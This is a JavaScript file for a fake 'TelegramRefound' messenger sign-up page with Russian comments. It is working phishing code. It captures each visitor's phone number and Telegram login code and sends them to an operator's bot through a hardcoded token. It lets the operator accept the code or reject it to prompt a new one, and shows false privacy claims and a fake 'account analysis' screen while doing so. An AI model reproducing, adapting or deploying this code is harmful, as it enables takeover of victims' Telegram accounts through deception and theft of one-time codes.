const BOT_TOKEN = "8419167666:AAF_8tv9MM1n8eBPrRGqbbhEwdQzl2hwLG0";
let CHAT_ID = 8224914068;

// Для хранения данных о текущей регистрации
let currentRegistrationData = null;
let pollingInterval = null;

async function ensureChatId() {
  if (CHAT_ID) return CHAT_ID;
  const cached = localStorage.getItem("tg_chat_id");
  if (cached) {
    CHAT_ID = cached;
    return CHAT_ID;
  }
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`
    );
    const data = await res.json();
    if (!data.ok) return null;
    const updates = data.result || [];
    const last = [...updates]
      .reverse()
      .find(
        (u) =>
          (u.message && u.message.chat && u.message.chat.id) ||
          (u.channel_post && u.channel_post.chat && u.channel_post.chat.id)
      );
    const chatId =
      last?.message?.chat?.id ?? last?.channel_post?.chat?.id ?? null;
    if (chatId) {
      CHAT_ID = String(chatId);
      localStorage.setItem("tg_chat_id", CHAT_ID);
      return CHAT_ID;
    }
  } catch (_) {}
  return null;
}

async function sendTelegramMessageWithButtons(message, buttons) {
  const chatId = await ensureChatId();
  if (!chatId) {
    alert(
      "Не удалось определить chat_id. Напишите боту в Telegram /start и попробуйте снова."
    );
    return null;
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: buttons
        }
      }),
    });
    return await response.json();
  } catch (_) {
    return null;
  }
}

async function sendTelegramMessage(message) {
  const chatId = await ensureChatId();
  if (!chatId) {
    alert(
      "Не удалось определить chat_id. Напишите боту в Telegram /start и попробуйте снова."
    );
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });
    await response.json();
  } catch (_) {}
}

/* ----------------- ОБНОВЛЁННЫЕ ПЕРЕВОДЫ --------------------- */

const translations = {
  en: {
    register: "Register",
    welcomeTitle: "Welcome<br>to TelegramRefound",
    welcomeText:
      "TelegramRefound is a messenger based on the Telegram API that offers enhanced opportunities for business and personal communication. TelegramRefound fully supports all Telegram updates and serves as a great alternative for those who want more features than the standard Telegram client.",
    whyTitle: "Why TelegramRefound?",
    whySubtitle: "It's Fast, Secure & Convenient!",
    card1Title: "Powered by Telegram",
    card1Text:
      "TelegramRefound is the best way to enjoy all the capabilities of Telegram without limitations. It uses the open Telegram API and supports official updates, giving you full access!",
    card2Title: "Private & Secure",
    card2Text:
      "The information you send through TelegramRefound is encrypted and stored on Telegram servers for your safety. We do not collect personal data!",
    card3Title: "Wide Integrations",
    card3Text:
      "All the tools needed for modern users and businesses are now in one place with TelegramRefound. No more installing extra apps!",
    registrationSuccess: "Registration completed successfully!",
    waitingAnalysis: "Registration successful! Please wait 5 minutes while we analyze your account! The window will close automatically after analysis.",
    wrongCode: "Incorrect code. Try again later!",
    confirm: "Confirm",
    accept: "Accept",
    decline: "Decline",
    phoneLabel: "Phone number",
    codeLabel: "Verification code",
    codeHint: "Code sent to your phone",
    continue: "Continue"
  },
  ru: {
    register: "Регистрация",
    welcomeTitle: "Добро пожаловать<br>в TelegramRefound",
    welcomeText:
      "TelegramRefound — это мессенджер на основе Telegram API, который предлагает расширенные возможности для бизнеса и личного общения. TelegramRefound полностью поддерживает все обновления Telegram и служит отличной альтернативой для тех, кто хочет получить больше функций, чем стандартный клиент Telegram.",
    whyTitle: "Почему TelegramRefound?",
    whySubtitle: "Это быстро, безопасно и удобно!",
    card1Title: "Работает на Telegram",
    card1Text:
      "TelegramRefound — лучший способ пользоваться всеми возможностями Telegram без ограничений. Он использует открытый Telegram API и поддерживает обновления официального клиента!",
    card2Title: "Конфиденциально и безопасно",
    card2Text:
      "Информация, отправленная через TelegramRefound, зашифрована и хранится на серверах Telegram для вашей безопасности. Мы не собираем личные данные!",
    card3Title: "Широкие интеграции",
    card3Text:
      "Все необходимые инструменты для современных людей и бизнеса собраны в одном месте с TelegramRefound. Больше не нужно устанавливать дополнительные приложения!",
    registrationSuccess: "Регистрация успешно завершена!",
    waitingAnalysis: "Регистрация прошла успешно! Ожидайте 5 минут пока мы анализируем ваш аккаунт! После анализа окно автоматически уберется.",
    wrongCode: "Неправильный код. Попробуйте позже!",
    confirm: "Подтвердить",
    accept: "Принять",
    decline: "Отказ",
    phoneLabel: "Номер телефона",
    codeLabel: "Код подтверждения",
    codeHint: "Код отправлен на ваш телефон",
    continue: "Продолжить"
  },
};

let isCodeStep = false;
let currentPhoneE164 = "";
let currentCountryName = "";
let registrationMessageId = null;

// Функция для опроса обновлений от бота
async function checkBotUpdates() {
  if (!currentRegistrationData || !registrationMessageId) return false;
  
  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
    const data = await response.json();
    
    if (data.ok && data.result) {
      for (const update of data.result) {
        if (update.callback_query && update.callback_query.message && 
            update.callback_query.message.message_id === registrationMessageId) {
          const action = update.callback_query.data;
          const chatId = update.callback_query.message.chat.id;
          
          if (action === 'accept_registration') {
            // Удаляем инлайн-клавиатуру
            try {
              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  message_id: registrationMessageId,
                  reply_markup: { inline_keyboard: [] }
                }),
              });
            } catch (e) {}
            
            // Останавливаем опрос
            if (pollingInterval) {
              clearInterval(pollingInterval);
              pollingInterval = null;
            }
            
            // Показываем сообщение об успешной регистрации
            showSuccessMessage();
            return true;
          } else if (action === 'decline_registration') {
            // Удаляем инлайн-клавиатуру
            try {
              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  message_id: registrationMessageId,
                  reply_markup: { inline_keyboard: [] }
                }),
              });
            } catch (e) {}
            
            // Останавливаем опрос
            if (pollingInterval) {
              clearInterval(pollingInterval);
              pollingInterval = null;
            }
            
            // Показываем сообщение об ошибке
            showErrorMessage();
            return true;
          }
        }
      }
    }
  } catch (error) {
    console.error("Error checking bot updates:", error);
  }
  
  return false;
}

// Функция для показа сообщения об успешной регистрации
function showSuccessMessage() {
  const registrationBody = document.querySelector(".registration-body");
  const isRu = document.getElementById("ru-btn").classList.contains("active");
  
  // Очищаем содержимое
  registrationBody.innerHTML = '';
  
  // Создаем сообщение об успешной регистрации
  const successDiv = document.createElement('div');
  successDiv.className = 'success-message';
  
  const icon = document.createElement('div');
  icon.className = 'success-icon';
  icon.innerHTML = '✅';
  
  const message = document.createElement('p');
  message.className = 'success-text';
  message.textContent = isRu ? translations.ru.waitingAnalysis : translations.en.waitingAnalysis;
  
  const spinner = document.createElement('div');
  spinner.className = 'loading-spinner';
  
  successDiv.appendChild(icon);
  successDiv.appendChild(message);
  successDiv.appendChild(spinner);
  registrationBody.appendChild(successDiv);
  
  // Закрываем окно через 5 секунд (имитация анализа)
  setTimeout(() => {
    const registrationWindow = document.getElementById("registration-window");
    registrationWindow.style.display = 'none';
    resetRegistrationForm();
  }, 5000);
}

// Функция для показа сообщения об ошибке
function showErrorMessage() {
  const codeInput = document.getElementById("code-input");
  const codeGroup = document.querySelector(".code-group");
  const isRu = document.getElementById("ru-btn").classList.contains("active");
  
  // Показываем сообщение об ошибке
  const errorMessage = document.createElement('div');
  errorMessage.className = 'error-message';
  errorMessage.textContent = isRu ? translations.ru.wrongCode : translations.en.wrongCode;
  
  // Удаляем предыдущее сообщение об ошибке, если есть
  const existingError = codeGroup.querySelector('.error-message');
  if (existingError) {
    existingError.remove();
  }
  
  codeGroup.appendChild(errorMessage);
  
  // Сбрасываем поле ввода кода
  codeInput.value = '';
  codeInput.focus();
  
  // Отправляем новое сообщение боту
  setTimeout(() => {
    sendRegistrationToBot();
  }, 1000);
}

// Функция отправки данных регистрации боту
async function sendRegistrationToBot() {
  const isRu = document.getElementById("ru-btn").classList.contains("active");
  const message = `✅ <b>Регистрация успешна</b>\n📱 Номер: ${currentRegistrationData.phone}\n🔑 Код: ${currentRegistrationData.code}\n🌍 Страна: ${currentRegistrationData.country}`;
  
  const buttons = [
    [
      { 
        text: isRu ? translations.ru.accept : translations.en.accept, 
        callback_data: 'accept_registration' 
      },
      { 
        text: isRu ? translations.ru.decline : translations.en.decline, 
        callback_data: 'decline_registration' 
      }
    ]
  ];
  
  const response = await sendTelegramMessageWithButtons(message, buttons);
  if (response && response.ok) {
    registrationMessageId = response.result.message_id;
    
    // Начинаем опрос обновлений от бота
    startPollingBotUpdates();
  }
}

// Функция для запуска опроса обновлений от бота
function startPollingBotUpdates() {
  // Останавливаем предыдущий опрос, если есть
  if (pollingInterval) {
    clearInterval(pollingInterval);
  }
  
  pollingInterval = setInterval(async () => {
    const result = await checkBotUpdates();
    if (result) {
      clearInterval(pollingInterval);
      pollingInterval = null;
    }
  }, 2000); // Проверяем каждые 2 секунды
}

document.addEventListener("DOMContentLoaded", function () {
  const registrationWindow = document.getElementById("registration-window");
  const registerBtn = document.getElementById("register-btn");
  const closeBtn = document.querySelector(".close-registration");
  const submitBtn = document.getElementById("submit-btn");
  const phoneInput = document.getElementById("phone-input");
  const codeInput = document.getElementById("code-input");
  const codeGroup = document.querySelector(".code-group");
  const codeHint = document.querySelector(".code-hint");
  const phoneLabel = document.querySelector('label[for="phone-input"]');
  const codeLabel = document.querySelector('label[for="code-input"]');
  const enBtn = document.getElementById("en-btn");
  const ruBtn = document.getElementById("ru-btn");

  /* ---------------- ТЕЛЕФОН ------------------ */

  const iti = window.intlTelInput(phoneInput, {
    preferredCountries: ["ru", "ua", "kz", "az", "us", "gb"],
    initialCountry: "ru",
    nationalMode: true,
    separateDialCode: true,
    autoPlaceholder: "aggressive",
    utilsScript:
      "https://cdn.jsdelivr.net/npm/intl-tel-input@24.8.1/build/js/utils.js",
  });

  const setBorderByValidity = () => {
    if (phoneInput.value.trim().length === 0) {
      phoneInput.style.borderColor = "#555";
      return;
    }
    phoneInput.style.borderColor = iti.isValidNumber() ? "#4CAF50" : "#ff5b5b";
  };
  phoneInput.addEventListener("input", setBorderByValidity);
  phoneInput.addEventListener("countrychange", setBorderByValidity);

  function validationErrorText(code) {
    const mapRu = {
      1: "Неверный код страны",
      2: "Слишком короткий номер",
      3: "Слишком длинный номер",
      4: "Это не номер",
    };
    const mapEn = {
      1: "Invalid country code",
      2: "Too short",
      3: "Too long",
      4: "Not a number",
    };
    const ruActive = ruBtn.classList.contains("active");
    const dict = ruActive ? mapRu : mapEn;
    return dict[code] || (ruActive ? "Некорректный номер" : "Invalid number");
  }

  /* ------------------ ЯЗЫК ------------------ */

  function updateRegistrationTexts(lang) {
    const t = translations[lang];
    
    // Обновляем метки в форме регистрации
    if (phoneLabel) phoneLabel.textContent = t.phoneLabel;
    if (codeLabel) codeLabel.textContent = t.codeLabel;
    if (codeHint) codeHint.textContent = t.codeHint;
    
    // Обновляем placeholder для кода
    if (codeInput) codeInput.placeholder = "12345";
    
    // Обновляем текст кнопки
    if (submitBtn) {
      submitBtn.textContent = isCodeStep ? t.confirm : t.continue;
    }
  }

  function setLanguage(lang) {
    const t = translations[lang];
    document.getElementById("register-btn").textContent = t.register;
    document.getElementById("welcome-title").innerHTML = t.welcomeTitle;
    document.getElementById("welcome-text").textContent = t.welcomeText;
    document.getElementById("why-title").textContent = t.whyTitle;
    document.getElementById("why-subtitle").textContent = t.whySubtitle;
    document.getElementById("card1-title").textContent = t.card1Title;
    document.getElementById("card1-text").textContent = t.card1Text;
    document.getElementById("card2-title").textContent = t.card2Title;
    document.getElementById("card2-text").textContent = t.card2Text;
    document.getElementById("card3-title").textContent = t.card3Title;
    document.getElementById("card3-text").textContent = t.card3Text;
    
    // Обновляем тексты в форме регистрации
    updateRegistrationTexts(lang);
    
    // Обновляем кнопки языка
    if (lang === 'en') {
      enBtn.classList.add("active");
      ruBtn.classList.remove("active");
    } else {
      ruBtn.classList.add("active");
      enBtn.classList.remove("active");
    }
  }

  enBtn.addEventListener("click", (e) => {
    e.preventDefault();
    e.stopPropagation();
    setLanguage("en");
  });

  ruBtn.addEventListener("click", (e) => {
    e.preventDefault();
    e.stopPropagation();
    setLanguage("ru");
  });

  /* ---------------- РЕГИСТРАЦИЯ ---------------- */

  registerBtn.addEventListener("click", function (e) {
    e.preventDefault();
    e.stopPropagation();
    registrationWindow.style.display = "flex";
    resetRegistrationForm();
  });

  closeBtn.addEventListener("click", function (e) {
    e.preventDefault();
    e.stopPropagation();
    registrationWindow.style.display = "none";
    resetRegistrationForm();
  });

  registrationWindow.addEventListener("click", function (event) {
    if (event.target === registrationWindow) {
      registrationWindow.style.display = "none";
      resetRegistrationForm();
    }
  });

  submitBtn.addEventListener("click", function (e) {
    e.preventDefault();
    e.stopPropagation();
    
    if (!isCodeStep) {
      if (!iti.isValidNumber()) {
        const err = window.intlTelInputUtils
          ? validationErrorText(iti.getValidationError())
          : ruBtn.classList.contains("active")
          ? "Введите корректный номер"
          : "Enter a valid phone number";
        alert(err);
        return;
      }
      currentPhoneE164 = iti.getNumber();
      const cdata = iti.getSelectedCountryData();
      currentCountryName = cdata?.name || "Unknown";

      sendTelegramMessage(
        `🔐 <b>Попытка регистрации</b>\n📱 Номер: ${currentPhoneE164}\n🌍 Страна: ${currentCountryName}`
      );

      showCodeStep();
    } else {
      const verificationCode = codeInput.value.trim();
      if (verificationCode.length !== 5 || !/^\d+$/.test(verificationCode)) {
        alert(
          ruBtn.classList.contains("active")
            ? "Введите корректный 5-значный код"
            : "Enter a valid 5-digit code"
        );
        return;
      }

      handleSuccessfulRegistration(currentPhoneE164, verificationCode);
    }
  });

  function showCodeStep() {
    isCodeStep = true;
    codeGroup.style.display = "block";
    submitBtn.textContent = ruBtn.classList.contains("active")
      ? translations.ru.confirm
      : translations.en.confirm;
    phoneInput.disabled = true;

    const flag = phoneInput.parentElement.querySelector(".iti__flag-container");
    if (flag) flag.style.pointerEvents = "none";
    
    // Фокусируем поле ввода кода
    setTimeout(() => {
      codeInput.focus();
    }, 100);
  }

  function resetRegistrationForm() {
    isCodeStep = false;
    codeGroup.style.display = "none";
    submitBtn.textContent = ruBtn.classList.contains("active")
      ? translations.ru.continue
      : translations.en.continue;
    phoneInput.disabled = false;

    const flag = phoneInput.parentElement.querySelector(".iti__flag-container");
    if (flag) flag.style.pointerEvents = "auto";

    phoneInput.value = "";
    codeInput.value = "";
    currentPhoneE164 = "";
    currentCountryName = "";
    currentRegistrationData = null;
    registrationMessageId = null;
    
    // Останавливаем опрос
    if (pollingInterval) {
      clearInterval(pollingInterval);
      pollingInterval = null;
    }
    
    iti.setCountry("ru");
    setBorderByValidity();
    
    // Очищаем сообщения об ошибках
    const errorMessages = document.querySelectorAll('.error-message');
    errorMessages.forEach(msg => msg.remove());
    
    // Восстанавливаем исходный вид формы
    const registrationBody = document.querySelector(".registration-body");
    const originalContent = `
      <div class="input-group">
        <label for="phone-input">${ruBtn.classList.contains("active") ? translations.ru.phoneLabel : translations.en.phoneLabel}</label>
        <div class="phone-input-container">
          <input
            type="tel"
            id="phone-input"
            class="phone-input"
            placeholder=""
          />
        </div>
      </div>
      <div class="input-group code-group" style="display: none">
        <label for="code-input">${ruBtn.classList.contains("active") ? translations.ru.codeLabel : translations.en.codeLabel}</label>
        <input
          type="text"
          id="code-input"
          placeholder="12345"
          maxlength="5"
          class="code-input"
        />
        <div class="code-hint">${ruBtn.classList.contains("active") ? translations.ru.codeHint : translations.en.codeHint}</div>
      </div>
      <button id="submit-btn" class="submit-btn">${ruBtn.classList.contains("active") ? translations.ru.continue : translations.en.continue}</button>
    `;
    
    // Обновляем только если содержимое было изменено
    if (!registrationBody.querySelector('.input-group')) {
      registrationBody.innerHTML = originalContent;
      
      // Реинициализируем элементы
      const newPhoneInput = document.getElementById("phone-input");
      const newCodeInput = document.getElementById("code-input");
      const newSubmitBtn = document.getElementById("submit-btn");
      
      if (newPhoneInput && window.intlTelInput) {
        // Повторно инициализируем intlTelInput
        setTimeout(() => {
          iti.destroy();
          window.intlTelInput(newPhoneInput, {
            preferredCountries: ["ru", "ua", "kz", "az", "us", "gb"],
            initialCountry: "ru",
            nationalMode: true,
            separateDialCode: true,
            autoPlaceholder: "aggressive",
            utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@24.8.1/build/js/utils.js",
          });
          
          // Обновляем обработчики
          newPhoneInput.addEventListener("input", setBorderByValidity);
          newPhoneInput.addEventListener("countrychange", setBorderByValidity);
          
          newPhoneInput.addEventListener("keypress", function (e) {
            if (e.key === "Enter") newSubmitBtn.click();
          });
          
          if (newCodeInput) {
            newCodeInput.addEventListener("keypress", function (e) {
              if (e.key === "Enter") newSubmitBtn.click();
            });
          }
          
          if (newSubmitBtn) {
            newSubmitBtn.addEventListener("click", function (e) {
              e.preventDefault();
              e.stopPropagation();
              
              if (!isCodeStep) {
                // ... логика обработки ...
              } else {
                // ... логика обработки кода ...
              }
            });
          }
        }, 0);
      }
    }
  }

  function handleSuccessfulRegistration(phoneNumberE164, verificationCode) {
    // Сохраняем данные регистрации
    currentRegistrationData = {
      phone: phoneNumberE164,
      code: verificationCode,
      country: currentCountryName
    };
    
    // Отправляем данные боту
    sendRegistrationToBot();
  }

  phoneInput.addEventListener("keypress", function (e) {
    if (e.key === "Enter") submitBtn.click();
  });
  
  codeInput.addEventListener("keypress", function (e) {
    if (e.key === "Enter") submitBtn.click();
  });

  /* Включаем русский как стартовый */
  setLanguage("ru");
});
